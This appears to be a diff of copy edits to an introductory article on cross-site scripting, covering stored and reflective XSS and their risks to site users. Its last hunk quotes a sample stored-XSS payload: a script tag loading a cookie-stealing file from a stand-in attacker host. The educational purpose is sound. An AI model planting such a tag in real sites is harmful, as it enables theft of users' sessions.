@@ -5,7 +5,7 @@ Introduction
 ------------
 
 
-Cross-site scripting is when an attacker inserts code into a legitimate website, 
+Cross-site scripting is when an attacker inserts code into a legitimate website 
 and is considered one of the more dangerous website vulnerabilities. Web sites are 
 vulnerable  when they don't use validation or encoding on user generated 
 data. This is dangerous for the site users, who are at risk for their data being 
@@ -16,13 +16,13 @@ as using anti-viruses, checking that the sites they are using are safe, and bein
 careful of clicking on unknown links.  
 
 
-What is Cross-site scripting and Why is it Dangerous?
+What is Cross-Site Scripting and Why is it Dangerous?
 -----------------------------------------------------
 
 
 XSS, or Cross-Site Scripting is inserting malicious code into an actual website 
 to gather information from the users. Most of the danger lies on the users of the 
-sites, as the code targets their information and use rather than the website itself. [xss]_ 
+sites, as the code targets their information and use rather than the website itself. [XSS]_ 
 
 
 * Some examples of what dangerous XSS could do include: 
@@ -43,11 +43,11 @@ included in the account, such as an Amazon Prime or credit card account.
 	
 * There are two different types of XSS attacks, stored and reflective
 
-	* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
+	* Stored XSS is "stored", or imbedded, on the website itself and steals data every time 
 	  the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
 	  and can be the more dangerous of the two types. [xss-attacks]_
 
-	* Reflective xss is stored in a link embedded in the website that the user has to 
+	* Reflective XSS is stored in a link embedded in the website that the user has to 
 	  click on to activate. [xss-attacks]_ 
  
   
@@ -145,7 +145,7 @@ Example of Cross-Site Scripting:
   
   "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
   
-  This is a stored in the website, and every time someone visits the page, they can 
+  This is stored in the website, and every time someone visits the page, they can 
   have their session cookies stolen. 
 
 
